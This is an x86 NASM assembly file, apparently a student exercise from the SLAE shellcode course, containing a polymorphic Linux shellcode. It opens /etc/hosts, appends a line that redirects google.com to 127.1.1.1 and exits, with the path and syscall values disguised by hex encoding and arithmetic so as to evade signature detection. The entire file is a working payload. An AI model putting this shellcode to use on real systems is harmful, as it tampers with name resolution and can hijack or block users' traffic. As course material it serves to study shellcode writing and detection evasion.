; poly_map.nasm
; 
; Adding a record in /etc/hosts
;
; Author: Xenofon Vassilakopoulos 
; 
; Student ID: SLAE - 1314 

global _start

section .text

_start:
    xor ecx, ecx
    xor edx, edx    
    xor eax, eax
    mov DWORD [esp-0x4],ecx
    mov DWORD [esp-0x8],0x7374736f
    mov DWORD [esp-0xc],0x682f2f2f
    mov DWORD [esp-0x10],0x6374652f
    sub esp,0x10
    mov ebx,esp
    mov cx, 0x3b1       ;permmisions
    add cx, 0x50
    mov al, 0x5
    int 0x80        ;syscall to open file
    mov ebx, eax
    xor eax, eax
    jmp short _ldata    ;jmp-call-pop technique to load the map

write_data:
    pop ecx
    mov dl,0x12
    add dl,0x3
    mov al,0x4
    int 0x80        ;syscall to write in the file

    add al,0x2
    int 0x80        ;syscall to close the file

    xor eax,eax
    mov al,0x1
    int 0x80        ;syscall to exit

_ldata:
    call write_data
    message db "127.1.1.1 google.com",0x0A
